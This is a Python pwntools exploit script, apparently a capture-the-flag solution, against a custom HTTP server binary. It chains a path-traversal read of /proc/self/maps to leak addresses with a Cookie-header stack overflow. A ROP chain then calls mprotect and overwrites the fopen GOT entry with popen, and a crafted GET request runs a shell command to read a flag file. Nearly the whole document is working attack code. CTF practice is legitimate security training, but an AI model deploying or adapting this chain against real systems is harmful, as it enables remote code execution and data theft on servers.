#!/usr/bin/env python
from pwn import *
from time import sleep
import requests

context.binary = e = ELF("./cs1337_patched")
libc = e.libc
gs = """
brva 0x212D
"""


def start():
    global HOST, PORT
    if args.LOCAL:
        p = e.process()
        HOST = 'localhost'
        PORT = 1338

    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
        HOST = host_port[0]
        PORT = host_port[1]
    return p


p = start()

sleep(1)

if args.GDB:
    gdb.attach(p, gdbscript=gs)
    pause()

io = remote(HOST, PORT)
io.send(f"""GET /../../../../../../../../../../../../../../../../proc/self/maps HTTP/1.1
Content-Length: 0\r
Cookie: id=pwn\r
Connection: keep-alive\r
\r\n""".encode())

io.recvuntil((b'HTTP/1.1 200 OK\n'
              b'Content-Type: text/plain\n'
              b'\n'))

e.address = int(io.recv(12).decode(), 16)

while True:
    _ = io.recvline()
    if b'libc.so.6' in _:
        break

libc.address = int(_[:12].decode(), 16)

log.info(hex(e.address))
log.info(hex(libc.address))

io.close()

RDI_RET = libc.address+0x000000000002a3e5
RSI_RET = libc.address+0x000000000002be51
RDX_R12_RET = libc.address+0x000000000011f2e7
RAX_RET = libc.address+0x0000000000045eb0
# mov [rdi], rax ; xor eax, eax ; ret
qwordRDI_RAX_RET = libc.address+0x0000000000042e83

rop = p64(RDI_RET)+p64(e.address) + \
    p64(RSI_RET)+p64(0xf000) + \
    p64(RDX_R12_RET)+p64(7)+p64(0) + \
    p64(libc.sym.mprotect) + \
    p64(RDI_RET)+p64(e.got.fopen) + \
    p64(RAX_RET)+p64(libc.sym.popen) + \
    p64(qwordRDI_RAX_RET) + \
    p64(RDI_RET)+p64(e.address+0x33DF) + \
    p64(RAX_RET)+b'r'+b'\0'*7 + \
    p64(qwordRDI_RAX_RET) + \
    p64(RDI_RET)+p64(e.address+0x339F) + \
    p64(RAX_RET)+b'r'+b'\0'*7 + \
    p64(qwordRDI_RAX_RET) + \
    p64(RDI_RET)+p64(9999999) + \
    p64(libc.sym.sleep)


io = remote(HOST, PORT)
io.send("""GET / HTTP/1.1
Content-Length: 0\r
Cookie: id=""".encode()+b'\0'*0x28+rop+b'\r\n')

io.close()


sleep(1)
pause()

# io = remote(HOST, PORT)
# io.send("""GET /ls HTTP/1.1
# Content-Length: 0\r
# Cookie: id=pwn\r\n""".encode())
# io.interactive()

io = remote(HOST, PORT)
io.send("""GET /cat<flag_2f5b7b1cb601ee86b4ede919f94958fd HTTP/1.1
Content-Length: 0\r
Cookie: id=pwn\r\n""".encode())

io.interactive()


p.interactive()
